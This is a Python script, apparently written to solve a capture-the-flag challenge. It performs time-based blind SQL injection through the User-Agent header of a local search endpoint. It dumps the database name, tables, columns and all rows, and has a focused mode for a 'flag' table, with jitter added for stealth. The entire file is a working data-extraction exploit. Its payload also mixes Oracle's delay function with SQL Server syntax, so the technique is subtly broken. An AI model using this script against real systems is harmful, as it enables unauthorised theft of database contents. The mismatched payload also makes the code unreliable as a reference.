import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
TARGET_URL = "http://localhost:8080/search"
DELAY = 2  # Base delay for time-based injection
JITTER = True

# Oracle function for time-based SQL injection
def oracle(query):
    """
    Time-based SQL injection oracle
    Returns True if query condition is true, False otherwise
    """
    payload = f"test' UNION SELECT NULL,NULL WHERE ({query}) AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),{DELAY}) IS NULL--"
    
    headers = {
        "User-Agent": payload,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "search": "test"
    }
    
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            headers=headers,
            data=data,
            timeout=DELAY + 5
        )
        elapsed = time.time() - start_time
        
        # If response takes longer than delay, condition is true
        return elapsed >= DELAY
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        print(f"Error in oracle: {e}")
        return False

def safe_oracle(query, max_retries=3):
    """Safe oracle with retry logic"""
    for attempt in range(max_retries):
        try:
            # Add jitter for stealth
            if JITTER:
                time.sleep(random.uniform(0.1, 0.5))
            
            result = oracle(query)
            return result
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
    return False

def dump_number(query):
    """
    Extract a number using bitwise analysis
    """
    value = 0
    for bit in range(8):  # 8 bits for numbers up to 255
        condition = f"({query}) & {1 << bit} > 0"
        if safe_oracle(condition):
            value |= (1 << bit)
    return value

def dump_string(query, length):
    """
    Extract a string character by character using bitwise analysis
    """
    result = ""
    for position in range(1, length + 1):
        char_code = 0
        for bit in range(7):  # 7 bits for ASCII
            condition = f"ASCII(SUBSTRING(({query}),{position},1)) & {1 << bit} > 0"
            if safe_oracle(condition):
                char_code |= (1 << bit)
        result += chr(char_code)
        print(f"[+] Progress: {result}", end="\r")
    print()  # New line after progress
    return result

def parallel_dump_string(query, length, max_workers=3):
    """
    Parallel string extraction for better performance
    """
    def extract_char(pos):
        char_code = 0
        for bit in range(7):
            condition = f"ASCII(SUBSTRING(({query}),{pos},1)) & {1 << bit} > 0"
            if safe_oracle(condition):
                char_code |= (1 << bit)
        return pos - 1, chr(char_code)  # Return position and character
    
    characters = [""] * length
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all character extraction tasks
        future_to_pos = {
            executor.submit(extract_char, pos): pos 
            for pos in range(1, length + 1)
        }
        
        # Collect results as they complete
        for future in as_completed(future_to_pos):
            pos, char = future.result()
            characters[pos] = char
            # Show progress
            current = "".join(characters)
            print(f"[+] Progress: {current}", end="\r")
    
    print()  # New line after progress
    return "".join(characters)

def get_database_info():
    """
    Extract complete database information
    """
    print("[+] Starting database enumeration...")
    
    # 1. Get database name length
    print("[+] Getting database name length...")
    db_name_length = dump_number("LEN(DB_NAME())")
    print(f"[+] Database name length: {db_name_length}")
    
    # 2. Get database name
    print("[+] Extracting database name...")
    db_name = parallel_dump_string("DB_NAME()", db_name_length)
    print(f"[+] Database name: {db_name}")
    
    return db_name, db_name_length

def get_tables_info(db_name):
    """
    Extract table information from database
    """
    print(f"[+] Enumerating tables in database: {db_name}")
    
    # 1. Get table count
    table_count_query = f"""
        SELECT COUNT(*) FROM information_schema.tables 
        WHERE TABLE_CATALOG='{db_name}'
    """
    num_tables = dump_number(table_count_query)
    print(f"[+] Number of tables: {num_tables}")
    
    # 2. Get table names
    tables = []
    for i in range(num_tables):
        print(f"[+] Extracting table {i+1}/{num_tables}...")
        
        # Get table name length
        table_length_query = f"""
            SELECT LEN(table_name) FROM information_schema.tables 
            WHERE table_catalog='{db_name}' 
            ORDER BY table_name 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        table_name_length = dump_number(table_length_query)
        
        # Get table name
        table_name_query = f"""
            SELECT table_name FROM information_schema.tables 
            WHERE table_catalog='{db_name}' 
            ORDER BY table_name 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        table_name = parallel_dump_string(table_name_query, table_name_length)
        tables.append(table_name)
        print(f"[+] Table {i+1}: {table_name}")
    
    return tables

def get_columns_info(db_name, table_name):
    """
    Extract column information from specific table
    """
    print(f"[+] Enumerating columns in table: {table_name}")
    
    # 1. Get column count
    column_count_query = f"""
        SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns 
        WHERE table_name='{table_name}' AND table_catalog='{db_name}'
    """
    num_columns = dump_number(column_count_query)
    print(f"[+] Number of columns: {num_columns}")
    
    # 2. Get column names
    columns = []
    for i in range(num_columns):
        print(f"[+] Extracting column {i+1}/{num_columns}...")
        
        # Get column name length
        column_length_query = f"""
            SELECT LEN(column_name) FROM INFORMATION_SCHEMA.columns 
            WHERE table_name='{table_name}' AND table_catalog='{db_name}' 
            ORDER BY column_name 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        column_name_length = dump_number(column_length_query)
        
        # Get column name
        column_name_query = f"""
            SELECT column_name FROM INFORMATION_SCHEMA.columns 
            WHERE table_name='{table_name}' AND table_catalog='{db_name}' 
            ORDER BY column_name 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        column_name = parallel_dump_string(column_name_query, column_name_length)
        columns.append(column_name)
        print(f"[+] Column {i+1}: {column_name}")
    
    return columns

def get_table_data(db_name, table_name, column_name):
    """
    Extract data from specific table column
    """
    print(f"[+] Extracting data from {table_name}.{column_name}")
    
    # 1. Get row count
    row_count_query = f"""
        SELECT COUNT(*) FROM {db_name}.dbo.{table_name}
    """
    num_rows = dump_number(row_count_query)
    print(f"[+] Number of rows: {num_rows}")
    
    # 2. Extract data from each row
    data = []
    for i in range(num_rows):
        print(f"[+] Extracting row {i+1}/{num_rows}...")
        
        # Get data length
        data_length_query = f"""
            SELECT LEN({column_name}) FROM {db_name}.dbo.{table_name} 
            ORDER BY {column_name} 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        data_length = dump_number(data_length_query)
        
        # Get data
        data_query = f"""
            SELECT {column_name} FROM {db_name}.dbo.{table_name} 
            ORDER BY {column_name} 
            OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY
        """
        row_data = parallel_dump_string(data_query, data_length)
        data.append(row_data)
        print(f"[+] Row {i+1}: {row_data}")
    
    return data

def main():
    """
    Main extraction workflow
    """
    print("=== Advanced SQL Injection Data Extractor ===")
    print(f"[*] Using base delay: {DELAY} seconds")
    print(f"[*] Jitter enabled: {JITTER}")
    
    try:
        # Step 1: Database information
        db_name, db_length = get_database_info()
        
        # Step 2: Table information
        tables = get_tables_info(db_name)
        
        # Step 3: For each table, get columns and data
        for table in tables:
            print(f"\n[*] Processing table: {table}")
            
            # Get columns
            columns = get_columns_info(db_name, table)
            
            # Extract data from each column
            for column in columns:
                data = get_table_data(db_name, table, column)
                print(f"\n[!] Data from {table}.{column}:")
                for i, value in enumerate(data):
                    print(f"    Row {i+1}: {value}")
        
        print("\n[+] Extraction completed successfully!")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
    except Exception as e:
        print(f"\n[!] Extraction failed: {e}")

# Alternative: Focused extraction for flag table only
def extract_flag_only():
    """
    Focused extraction specifically for flag table
    """
    print("[+] Starting focused flag extraction...")
    
    # Get database name
    db_name_length = dump_number("LEN(DB_NAME())")
    db_name = parallel_dump_string("DB_NAME()", db_name_length)
    print(f"[+] Database: {db_name}")
    
    # Check if flag table exists
    flag_table_check = f"""
        SELECT COUNT(*) FROM information_schema.tables 
        WHERE TABLE_CATALOG='{db_name}' AND TABLE_NAME='flag'
    """
    if dump_number(flag_table_check) == 0:
        print("[!] Flag table not found!")
        return
    
    print("[+] Flag table found!")
    
    # Get flag column
    flag_column_query = f"""
        SELECT column_name FROM INFORMATION_SCHEMA.columns 
        WHERE table_name='flag' AND table_catalog='{db_name}'
    """
    flag_column_length = dump_number(f"LEN(({flag_column_query}))")
    flag_column = parallel_dump_string(flag_column_query, flag_column_length)
    print(f"[+] Flag column: {flag_column}")
    
    # Extract flag data
    flag_data_query = f"""
        SELECT {flag_column} FROM {db_name}.dbo.flag
    """
    flag_data_length = dump_number(f"LEN(({flag_data_query}))")
    flag_data = parallel_dump_string(flag_data_query, flag_data_length)
    
    print(f"\n[!] FLAG FOUND: {flag_data}")
    return flag_data

if __name__ == "__main__":
    # Choose extraction method
    print("Select extraction method:")
    print("1. Full database extraction")
    print("2. Focused flag extraction")
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        main()
    elif choice == "2":
        extract_flag_only()
    else:
        print("Invalid choice, defaulting to focused flag extraction")
        extract_flag_only()